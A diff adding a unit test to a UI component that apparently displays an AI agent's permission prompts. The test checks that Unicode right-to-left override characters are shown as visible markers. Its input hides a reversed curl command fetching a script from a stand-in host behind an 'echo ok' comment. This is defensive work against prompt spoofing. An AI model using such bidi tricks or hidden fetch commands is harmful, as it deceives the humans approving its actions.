@@ -306,6 +306,35 @@ describe('PromptCard', () => {
     expect(screen.queryByText('Answer sent…')).toBeNull()
   })
 
+  it('marks the characters that reorder or hide text in what the agent shows', () => {
+    // U+202E makes the tail read backwards: the command that runs differs
+    // from the one the card would show
+    const rlo = '\u202e'
+    renderCard({
+      ...permission,
+      title: `Bash ${rlo}command`,
+      body: `echo ok #${rlo};hs.lim/ve.x//:sptth lruc\u202c\nDo you want to proceed?`,
+      options: [
+        { index: 1, label: `Yes${rlo}` },
+        { index: 2, label: 'Yes, and always allow', detail: `for${rlo} ls` },
+        { index: 3, label: 'No' },
+      ],
+      steps: [{ label: `Tab${rlo}`, current: true }],
+    })
+    const card = screen.getByRole('alertdialog')
+    expect(card.textContent).not.toMatch(/[\u202a-\u202e\u2066-\u2069]/)
+    expect(card.textContent).toContain('echo ok #⟨U+202E⟩;hs.lim')
+    expect(card.textContent).toContain('lruc⟨U+202C⟩')
+    expect(card.textContent).toContain('Bash ⟨U+202E⟩command')
+    expect(card.textContent).toContain('Yes⟨U+202E⟩')
+    expect(card.textContent).toContain('for⟨U+202E⟩ ls')
+    expect(card.textContent).toContain('Tab⟨U+202E⟩')
+    // The body keeps its lines
+    expect(screen.getByText(/Do you want to proceed\?/).textContent).toContain(
+      '\n',
+    )
+  })
+
   it('a dialog without a title or body still reads', () => {
     renderCard({ kind: 'unsupported', title: '' }, true)
     expect(
